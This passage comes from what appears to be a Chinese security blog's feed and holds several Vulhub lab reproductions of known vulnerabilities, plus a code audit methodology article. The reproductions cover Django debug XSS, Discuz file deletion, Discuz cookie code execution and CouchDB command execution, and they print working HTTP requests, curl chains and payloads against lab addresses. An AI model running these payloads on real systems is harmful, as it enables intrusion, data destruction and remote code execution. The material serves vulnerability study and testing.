      <tags>
        <tag>Vulhub复现</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django debug page XSS漏洞（CVE-2017-12794）分析</title>
    <url>/2021/07/12/Django%20debug%20page%20XSS%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12794%EF%BC%89%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Django-debug-page-XSS漏洞（CVE-2017-12794）"><a href="#Django-debug-page-XSS漏洞（CVE-2017-12794）" class="headerlink" title="Django debug page XSS漏洞（CVE-2017-12794）"></a>Django debug page XSS漏洞（CVE-2017-12794）</h1><a id="more"></a>

<p>在使用Postgres数据库并触发异常的时候，psycopg2会将字段名和字段值全部抛出。那么，如果字段值中包含我们可控的字符串，又由于0x02中说到的，这个字符串其实就会被设置成<code>__cause__</code>，最后被显示在页面中。</p>
<p>所以我们假设有如下场景：</p>
<ol>
<li>用户注册页面，未检查用户名</li>
<li>注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li>
<li>再次注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li>
<li>触发duplicate key异常，导致XSS漏洞</li>
</ol>
<p>访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>创建一个用户，成功；再次访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>，触发异常：</p>
<p>可见，Postgres抛出的异常为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">duplicate key value violates unique constraint &quot;xss_user_username_key&quot;</span><br><span class="line">DETAIL:  Key (username)&#x3D;(&lt;script&gt;alert(1)&lt;&#x2F;script&gt;) already exists.</span><br></pre></td></tr></table></figure>

<p>这个异常被拼接进<code>The above exception () was the direct cause of the following exception</code>，最后触发XSS。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Discuz!X ≤3.4 任意文件删除漏洞</title>
    <url>/2021/07/12/Discuz!X%20%E2%89%A43.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Discuz-X-≤3-4-任意文件删除漏洞"><a href="#Discuz-X-≤3-4-任意文件删除漏洞" class="headerlink" title="Discuz!X ≤3.4 任意文件删除漏洞"></a>Discuz!X ≤3.4 任意文件删除漏洞</h1><p>影响版本：Discuz!X ≤3.4</p>
<p>漏洞详情：<a href="https://lorexxar.cn/2017/09/30/dz-delete/" target="_blank" rel="noopener">https://lorexxar.cn/2017/09/30/dz-delete/</a></p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>安装时，只用修改数据库地址为<code>db</code>，其他保持默认即可：</p>
<p>访问<code>http://your-ip/robots.txt</code>可见robots.txt是存在的：</p>
<p><img src="https://image.3001.net/images/20210712/16260659173087.png" alt="image-20210712113726398"></p>
<p>注册用户后，在个人设置页面找到自己的formhash：</p>
<p><img src="https://image.3001.net/images/20210712/16260659199806.png" alt="image-20210712114035351"></p>
<p>带上自己的Cookie、formhash发送如下数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132</span><br><span class="line">Content-Length: 367</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;61.0.3163.79 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en;q&#x3D;0.6</span><br><span class="line">Cookie: kuR_sid&#x3D;Ph7B1z; kuR_visitedfid&#x3D;2; kuR_oldtopics&#x3D;D9D; kuR_fid2&#x3D;1626059361; cX12_2132_saltkey&#x3D;gKvOCcWp; cX12_2132_lastvisit&#x3D;1626057387; cX12_2132_sid&#x3D;dZ5u5n; cX12_2132_sendmail&#x3D;1; cX12_2132_seccode&#x3D;4.cf81c2f22450b44402; cX12_2132_ulastactivity&#x3D;74ad7MDBgeRzQhefqHjDOHWk%2BLDI7N93qzr15Z0Xy9%2BTgoT0M1tT; cX12_2132_auth&#x3D;3c8bbqDUXEphLP2a%2F40d75mQSUODAo%2BlzyHq5c0jDIZ2fUVbZ6zdxI0WT7X2JIAzG9ky9Dh55mhnX1TO9s%2FM; cX12_2132_home_readfeed&#x3D;1626061120; cX12_2132_noticeTitle&#x3D;1; cX12_2132_home_diymode&#x3D;1; cX12_2132_lastact&#x3D;1626061279%09home.php%09spacecp; cX12_2132_checkpm&#x3D;1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;formhash&quot;</span><br><span class="line"></span><br><span class="line">14c44716</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;birthprovince&quot;</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;robots.txt</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;profilesubmit&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s--</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210712/16260659248357.png" alt="image-20210712114323807"></p>
<p>提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：</p>
<p><img src="https://image.3001.net/images/20210712/16260659278674.png" alt="image-20210712114416344"></p>
<p>说明我们的脏数据已经进入数据库了。</p>
<p>然后，新建一个<code>upload.html</code>，代码如下，将其中的<code>[your-ip]</code>改成discuz的域名，<code>[form-hash]</code>改成你的formhash：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;[your-ip]&#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base&amp;profilesubmit&#x3D;1&amp;formhash&#x3D;[form-hash]&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;birthprovince&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<p>用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。</p>
<p>再次访问<code>http://192.168.44.132/robots.txt</code>，发现文件成功被删除：</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Discuz</tag>
      </tags>
  </entry>
  <entry>
    <title>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</title>
    <url>/2021/07/12/Discuz%207.x6.x%20%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p>
<a id="more"></a>

<p>具体原理请参考：</p>
<ul>
<li><a href="https://www.secpulse.com/archives/2338.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2338.html</a></li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动Discuz 7.2，启动后，访问<code>http://192.168.44.132:8080/install/</code>来安装discuz，数据库地址填写<code>db</code>，数据库名为<code>discuz</code>，数据库账号密码均为<code>root</code>。</p>
<p>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;viewthread.php?tid&#x3D;9&amp;extra&#x3D;page%3D1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.124 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;forumdisplay.php?fid&#x3D;2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: GLOBALS[_DCACHE][smilies][searcharray]&#x3D;&#x2F;.*&#x2F;eui; GLOBALS[_DCACHE][smilies][replacearray]&#x3D;phpinfo();</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>phpinfo已成功执行：</p>
<p><img src="https://image.3001.net/images/20210712/16260657953088.png" alt="image-20210712111332661"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Discuz</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计方法论</title>
    <url>/2021/07/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/</url>
    <content><![CDATA[<h2 id="代码审计方法论"><a href="#代码审计方法论" class="headerlink" title="代码审计方法论"></a>代码审计方法论</h2><a id="more"></a>

<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a><strong>1、介绍</strong></h2><p>代码审计(CodeAudit) 就是根据了解到的程序功能和关键业务，针对程序源代码逐条进行检查和分析，找出源代码中可能引发的常见安全漏洞和业务逻辑问题的缺陷，并提供代码修改建议或解决方案。</p>
<p>针对于源代码审计工作环境的部署，其实如果是以服务的方式为客户的代码进行审计，审计的环境一般都会相对复杂，会面临几种情况： </p>
<ol>
<li>最理想的环境，客户提供代码同时有对应的测试环境，这样的话就可以黑盒+白盒进行审计，可以提高审计的效率和覆盖度。</li>
<li>只提供项目源代码，需要自己梳理整个项目源码的架构，通读所有关键代码，相对时间成本比较大，但是可以彻底了解整个项目源代码并且挖掘出高质量漏洞。</li>
<li>只提供源代码片段，这种情况首先需要跟客户沟通是否可以提供完整项目源代码，否则是在一定程度影响源代码审计的完整性，因为部分功能代码片段可能会找不到调用的接口函数，无法追踪业务逻辑代码。</li>
</ol>
<p>所以客户的代码审计服务基本上没有搭建环境的情况，因为他们不会提供数据库，想跑也跑不起来。</p>
<h2 id="2、源代码审计前期准备"><a href="#2、源代码审计前期准备" class="headerlink" title="2、源代码审计前期准备"></a>2、源代码审计前期准备</h2><ol>
<li>需要和客户确认最新源代码版本</li>
<li>需要客户准备入场后代码审计环境，是我们自备电脑审计还是在客户专用的电脑上做审计</li>
<li>如果是专用的电脑，需要在电脑上安装office或者wps、代码编辑器及IDE工具，同时部署代码审计工具</li>
<li>需要提供被审计系统相关需求文档及设计文档，帮助审计人员了解业务，可以深入业务进行审计</li>
<li>需要跟开发团队提前打好招呼，为审计人员讲解代码结构，可以方便审计人员迅速进入审计工作中</li>
</ol>
<p><strong>常用源代码审计相关工具如下</strong></p>
<h3 id="2-1-自动化工具"><a href="#2-1-自动化工具" class="headerlink" title="2.1 自动化工具"></a>2.1 自动化工具</h3><p>Fortify、CheckMarx、Sonarqube</p>
<h3 id="2-2-辅助工具"><a href="#2-2-辅助工具" class="headerlink" title="2.2 辅助工具"></a>2.2 辅助工具</h3><p>Sublime text、Notepad++、EclipseIDE、JetBrain(CLion、IDEA、PyCharm、GoLang、PhpStorm…)</p>
<h2 id="3、审计流程"><a href="#3、审计流程" class="headerlink" title="3、审计流程"></a><strong>3、审计流程</strong></h2><p><img src="https://image.3001.net/images/20210708/1625755871425.png" alt="image-20210708222505722"></p>
<h2 id="4、人工审计思路"><a href="#4、人工审计思路" class="headerlink" title="4、人工审计思路"></a><strong>4、人工审计思路</strong></h2><h3 id="4-1-正向数据流分析法-根据业务推代码"><a href="#4-1-正向数据流分析法-根据业务推代码" class="headerlink" title="4.1 正向数据流分析法-根据业务推代码"></a><strong>4.1 正向数据流分析法-根据业务推代码</strong></h3><p><strong>描述</strong></p>
<p>寻找敏感功能点，通读功能点代码；<br>正向审计即从功能入口点进行跟踪，一直到数据流处理结束；</p>
<p><strong>优点</strong></p>
<p>精准定向挖掘，利用程度高；对程序有整体把握，能较全面的覆盖各种不同类的功能点，能挖掘到有价值的逻辑漏洞，有助于高质量的交付。</p>
<p><strong>缺点</strong></p>
<p>命名不规范的代码容易被忽略，导致失去先机；<br>慢，易迷失在海量代码之间；<br>难，绕不过去的框架问题。</p>
<p><strong>针对性漏洞</strong></p>
<p>登录，找回密码，文件上传，任意文件下载，验证码漏洞，流程绕过，越权等无明显特征等漏洞。</p>
<p><strong>数据流分析流程图</strong></p>
<p><img src="https://image.3001.net/images/20210708/16257558746870.png" alt="image-20210708222549720"></p>
<h4 id="常见的不可信数据入口方法"><a href="#常见的不可信数据入口方法" class="headerlink" title="常见的不可信数据入口方法"></a><strong>常见的不可信数据入口方法</strong></h4><p><em>JAVA</em></p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>getParameter</td>
<td>request类获取参数方法</td>
</tr>
<tr>
<td>getParameterNames</td>
<td>获取参数名</td>
</tr>
<tr>
<td>getParameterValues</td>
<td>获取参数值</td>
</tr>
<tr>
<td>getParameterMap</td>
<td>获取参数map类型</td>
</tr>
<tr>
<td>getQueryString</td>
<td>获取URL的value值</td>
</tr>
<tr>
<td>getHeader</td>
<td>获取http请求头</td>
</tr>
<tr>
<td>getHeaderNames</td>
<td>获取请求头名</td>
</tr>
<tr>
<td>getRequestURI</td>
<td>获取请求URL</td>
</tr>
<tr>
<td>getCookies</td>
<td>获取cookie</td>
</tr>
<tr>
<td>getRequestedSessionId</td>
<td>获取sessionid</td>
</tr>
<tr>
<td>getInputStream</td>
<td>获取输入数据</td>
</tr>
<tr>
<td>getReader</td>
<td>获取请求内容</td>
</tr>
<tr>
<td>getMethod</td>
<td>获取请求方法</td>
</tr>
<tr>
<td>getProtocol</td>
<td>获取请求协议</td>
</tr>
<tr>
<td>getServerName</td>
<td>获取服务名</td>
</tr>
<tr>
<td>getRemoteUser</td>
<td>获取当前缓存的用户</td>
</tr>
<tr>
<td>getUserPrincipal</td>
<td>获取用户指纹</td>
</tr>
</tbody></table>
<p><em>PHP</em></p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>$_GET</td>
<td>GET方法请求参数获取</td>
</tr>
<tr>
<td>$_POST</td>
<td>POST方法请求参数获取</td>
</tr>
<tr>
<td>$_COOKIE</td>
<td>获取请求中cookie</td>
</tr>
<tr>
<td>$_REQUEST</td>
<td>$_REQUEST可以获取以POST、GET方法提交的数据</td>
</tr>
<tr>
<td>$_FILES</td>
<td>POST方法上传文件</td>
</tr>
<tr>
<td>$_SERVER[‘REQUEST_METHOD’]</td>
<td>访问页面时的请求方法</td>
</tr>
<tr>
<td>$_SERVER[‘QUERY_STRING’]</td>
<td>查询(query)的字符串</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_ACCEPT’]</td>
<td>当前请求的Accept:头部的内容</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_HOST’]</td>
<td>当前请求的HOST:头部的内容</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_REFERER’]</td>
<td>当前请求的HOST:头部的内容</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_USER_AGENT’]</td>
<td>当前请求的HOST:头部的内容</td>
</tr>
</tbody></table>
<h4 id="常见的不可信文件访问方法"><a href="#常见的不可信文件访问方法" class="headerlink" title="常见的不可信文件访问方法"></a><strong>常见的不可信文件访问方法</strong></h4><p><em>JAVA</em></p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>java.io.FileInputStream</td>
<td>文件输入</td>
</tr>
<tr>
<td>java.io.FileOutputStream</td>
<td>文件输出</td>
</tr>
<tr>
<td>java.io.FileReader</td>
<td>文件读取</td>
</tr>
<tr>
<td>java.io.FileWriter</td>
<td>文件写入</td>
</tr>
</tbody></table>
<p><em>PHP</em></p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>file_get_contents</td>
<td>文件输入</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>文件输出</td>
</tr>
<tr>
<td>fread</td>
<td>文件读取</td>
</tr>
<tr>
<td>fwrite</td>
<td>文件输出</td>
</tr>
</tbody></table>
<h3 id="4-2-逆向数据流分析法-根据缺陷推业务"><a href="#4-2-逆向数据流分析法-根据缺陷推业务" class="headerlink" title="4.2 逆向数据流分析法-根据缺陷推业务"></a><strong>4.2 逆向数据流分析法-根据缺陷推业务</strong></h3><p><strong>描述</strong></p>
<p>根据敏感关键字回溯参数传递过程；<br>逆向审计即先根据一些关键词搜索，定位到可能存在风险的关键词/函数，再反推到功能入口，看整个处理过程是否存在漏洞。</p>
<p><strong>优点</strong></p>
<p>针对性强，通过搜索敏感关键字可快速定位可能存在的漏洞，可快速、高效、定向的挖掘高质量的漏洞。</p>
<p><strong>缺点</strong></p>
<p>对程序整体了解不够深入，在漏洞定位时比较耗时，覆盖面不够全面，对逻辑漏洞往往覆盖不到。</p>
<p><strong>针对漏洞</strong></p>
<p>SQL注入，命令注入，反序列化等特征明显的漏洞。</p>
<p>针对常规漏洞（指纹识别度高）：如SQLi、CMDi、线程安全等<br>Ibatis、Mybatis：使用xml做SQL映射，搜索$、${、+可以定位<br>Hibernate：代码中的HQL，搜索字符串拼接的关键字Concat、append、+等</p>
<p><strong>数据流分析流程图</strong></p>
<p><img src="https://image.3001.net/images/20210708/16257558812248.png" alt="image-20210708222647520"></p>
<p><strong>危险函数/关键字</strong></p>
<table>
<thead>
<tr>
<th>漏洞</th>
<th>方法</th>
</tr>
</thead>
<tbody><tr>
<td>SQL</td>
<td>Statement,  PreparedStatement,sql,$,hql</td>
</tr>
<tr>
<td>XXE</td>
<td>SAXReader,DocumentBuilder,XMLStreamReader</td>
</tr>
<tr>
<td>FILE</td>
<td>MultipartFile,createNewFile,FileInputStream</td>
</tr>
<tr>
<td>SSRF</td>
<td>HttpCilent,URL,ImageIO,HttpURLConnection,OkHttpCilent</td>
</tr>
<tr>
<td>EXEC</td>
<td>getRuntime.exec,processBuilder.start</td>
</tr>
</tbody></table>
<h3 id="4-3-总结"><a href="#4-3-总结" class="headerlink" title="4.3 总结"></a><strong>4.3 总结</strong></h3><p><strong>正向数据流分析法</strong></p>
<p>优点：快速开展，快速定位，有效挖掘严重漏洞。<br>缺陷：可能遗漏某些隐藏接口/url</p>
<p><strong>逆向数据流分析法</strong></p>
<p>优点：较为全面的对所有接口/url进行跟踪审计<br>缺点：比较耗时，审计到可能无法有效利用的漏洞</p>
<p><strong>建议优先关注的漏洞类型</strong></p>
<p>命令执行 &gt; 代码执行 &gt; 文件操作(上传/包含/下载) &gt; SQL注入 &gt; 逻辑漏洞&gt; SSRF &gt; XSS&gt;CSRF&gt;XXE&gt;反序列化</p>
<hr>
<p>参考链接：</p>
<p><a href="https://www.yuque.com/haibei-a8jfo/vsoi0z/efynxz" target="_blank" rel="noopener">https://www.yuque.com/haibei-a8jfo/vsoi0z/efynxz</a></p>
<p><a href="https://www.cnblogs.com/afanti/p/13156152.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/13156152.html</a></p>
<p><a href="https://mp.weixin.qq.com/s/DfgAdzpyZCRIZTsfzE8A4A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/DfgAdzpyZCRIZTsfzE8A4A</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Couchdb 任意命令执行 (CVE-2017-12636)</title>
    <url>/2021/05/20/Couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20(CVE-2017-12636)/</url>
    <content><![CDATA[<h1 id="Apache-Couchdb-任意命令执行-CVE-2017-12636"><a href="#Apache-Couchdb-任意命令执行-CVE-2017-12636" class="headerlink" title="Apache Couchdb 任意命令执行 (CVE-2017-12636)"></a>Apache Couchdb 任意命令执行 (CVE-2017-12636)</h1><p>Apache CouchDB 是一个开源的面向文档的 NoSQL 数据库，用 Erlang 实现。CouchDB 使用多种格式和协议来存储、传输和处理其数据。它使用 JSON 来存储数据，使用 MapReduce 作为其查询语言的 JavaScript，以及作为 API 的 HTTP。</p>
<p>CouchDB 管理用户可以通过 HTTP(S) 配置数据库服务器。一些配置选项包括随后由 CouchDB 启动的操作系统级二进制文件的路径。这允许 1.7.0 之前的 Apache CouchDB 和 2.1.1 之前的 2.x 中的管理员用户作为 CouchDB 用户执行任意 shell 命令，包括从公共互联网下载和执行脚本。</p>
<p>结合CVE-2017-12635和 CVE-2017-12636 以获得未经身份验证的远程命令执行。</p>
<a id="more"></a>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>CVE-2017-12636是认证后RCE，所以如果不知道目标管理员密码，可以先使用<code>CVE-2017-12635</code>添加管理员用户。Couchdb 2.x 和 1.x 的 API 接口有所不同，因此该漏洞的利用方式不同。</p>
<h3 id="在-1-x-下利用"><a href="#在-1-x-下利用" class="headerlink" title="在 1.x 下利用"></a>在 1.x 下利用</h3><p>依次执行以下请求，触发任意命令执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39; -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;: &quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#x2F;_temp_view?limit&#x3D;10&#39; -d &#39;&#123;&quot;language&quot;: &quot;cmd&quot;, &quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>vulhub:vulhub</code>是管理员帐户和密码。</p>
<p>第一个请求是添加一个带有 name和 value的<strong>query_servers</strong>，这是我们稍后要执行的命令。<code>cmd``&quot;id &gt;/tmp/success&quot;</code></p>
<p><img src="https://image.3001.net/images/20210702/16252251819024.png" alt="image-20210702152415688"></p>
<p>第二个和第三个请求是添加数据库和文档，这里添加后才能查询。</p>
<p><img src="https://image.3001.net/images/20210702/16252251829734.png" alt="image-20210702152555774"></p>
<p>第四个请求是在这个Database做一个查询，使用我在第一步添加的一个名为<strong>query_servers的</strong><code>cmd</code>，最后触发命令执行。</p>
<p><img src="https://image.3001.net/images/20210702/1625225186602.png" alt="image-20210702152700444"></p>
<p>可以看到success文件生成，证明利用成功</p>
<p><img src="https://image.3001.net/images/20210702/1625225189352.png" alt="image-20210702153011827"></p>
<h3 id="在-2-x-下利用"><a href="#在-2-x-下利用" class="headerlink" title="在 2.x 下利用"></a>在 2.x 下利用</h3><p>Couchdb 2.x 引入了集群，浏览器<code>/_membership</code>获取节点列表。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;_membership</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210702/16252252021646.png" alt="image-20210702154715987"></p>
<p>只有一个节点，名称为<code>nonode@nohost</code>，然后修改node的配置<code>nonode@nohost</code>如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;_node&#x2F;nonode@nohost&#x2F;_config&#x2F;query_servers&#x2F;cmd -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210702/16252251994376.png" alt="image-20210702155029361"></p>
<p>然后，以与 1.6.0 漏洞相同的方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;: &quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>Couchdb 2.x 已移除<code>_temp_view</code>，因此我们需要添加一个<code>_view</code>以触发 中定义的命令<code>query_servers</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#x2F;_design&#x2F;vul -d &#39;&#123;&quot;_id&quot;:&quot;_design&#x2F;test&quot;, &quot;views&quot;:&#123;&quot;woyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot; language&quot;: &quot;cmd&quot;&#125;&#39; -H &quot;Content-Type: application&#x2F;json&quot;</span><br></pre></td></tr></table></figure>

<p>然后<code>query_servers</code>将执行输入的命令。</p>
<h2 id="POC-脚本"><a href="#POC-脚本" class="headerlink" title="POC 脚本"></a>POC 脚本</h2><p>一个简单的POC <a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py" target="_blank" rel="noopener">exp.py</a>，将脚本里面的target和command修改为你的test target，然后将版本修改为对应的Couchdb版本（1或2），成功得到反向shell。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apache Couchdb</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Couchdb 远程权限提升 (CVE-2017-12635)</title>
    <url>/2021/05/19/Apache%20Couchdb%20%E8%BF%9C%E7%A8%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%20(CVE-2017-12635)/</url>
    <content><![CDATA[<h1 id="Apache-Couchdb-远程权限提升-CVE-2017-12635"><a href="#Apache-Couchdb-远程权限提升-CVE-2017-12635" class="headerlink" title="Apache Couchdb 远程权限提升 (CVE-2017-12635)"></a>Apache Couchdb 远程权限提升 (CVE-2017-12635)</h1><p>Apache CouchDB 是一个开源的面向文档的 NoSQL 数据库，用 Erlang 实现。CouchDB 使用多种格式和协议来存储、传输和处理其数据。它使用 JSON 来存储数据，使用 MapReduce 作为其查询语言的 JavaScript，以及作为 API 的 HTTP。</p>
<p>由于基于 Erlang 的 JSON 解析器和基于 JavaScript 的 JSON 解析器的差异，在 1.7.0 之前的 Apache CouchDB 和 2.1.1 之前的 2.x 中可以提交<code>_users</code>带有重复键的文档，<code>roles</code>用于数据库内的访问控制，包括特殊情况<code>_admin</code>角色，表示管理用户。</p>
<a id="more"></a>

<p>参考链接。</p>
<ul>
<li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li>
